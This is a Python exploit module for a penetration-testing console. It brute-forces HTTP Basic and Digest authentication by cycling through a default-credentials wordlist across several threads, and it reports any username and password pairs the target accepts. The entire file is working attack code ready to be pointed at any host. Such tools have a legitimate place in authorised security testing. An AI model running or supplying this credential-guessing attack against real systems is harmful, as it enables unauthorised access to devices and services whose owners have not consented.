from thgconsole.core.ModulesBuild.Exploits.exploit import *
from thgconsole.core.ModulesBuild.Exploits.option import *
from thgconsole.core.CoreUtils.exceptions import *
from thgconsole.core.ModulesBuild.Exploits.shell import *
from thgconsole.core.CoreUtils.utils import *
from thgconsole.core.CoreUtils.option import *
from thgconsole.core.CoreUtils.printer import *
from thgconsole.core.NetworkProtocols.http.http_client import HTTPClient
from thgconsole import file_suport
from requests.auth import HTTPDigestAuth


class Exploit(HTTPClient):
    __info__ = {
        "name": "HTTP Basic/Digest Default Creds",
        "description": "Module performs dictionary attack with default credentials against HTTP Basic/Digest Auth service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "darkcode357@gmail.com",  # thg module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = THGOptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = THGOptPort(80, "Target HTTP port")

    threads = THGOptInteger(8, "Number of threads")

    defaults = THGOptWordlist(file_suport.wordlists.worst_passwords500, "User:Pass or file with default credentials (file://)")

    path = THGOptString("/", "URL Path")

    verbosity = THGOptBool(True, "Display authentication attempts")
    stop_on_success = THGOptBool(True, "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.auth_type = None

        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack against {}".format(self.path))

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":")

                if self.auth_type == "digest":
                    auth = HTTPDigestAuth(username, password)
                else:
                    auth = (username, password)

                response = self.http_request(
                    method="GET",
                    path=self.path,
                    auth=auth,
                )

                if response is not None and response.status_code != 401:
                    if self.stop_on_success:
                        running.clear()

                    print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))

                else:
                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

            except StopIteration:
                break

    def check(self):
        response = self.http_request(
            method="GET",
            path=self.path
        )

        if response is None:
            return False

        if response.status_code != 401 or "WWW-Authenticate" not in response.headers.keys():
            print_error("Resource {} is not protected by Basic/Digest Auth".format(self.path), verbose=self.verbosity)
            return False

        if "Basic" in response.headers["WWW-Authenticate"]:
            print_status("Target exposes resource {} protected by Basic Auth".format(self.path), verbose=self.verbosity)
            self.auth_type = "basic"
            return True
        elif "Digest" in response.headers["WWW-Authenticate"]:
            print_status("Target exposes resource {} protected by Digest Auth".format(self.path), verbose=self.verbosity)
            self.auth_type = "digest"
            return True

        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
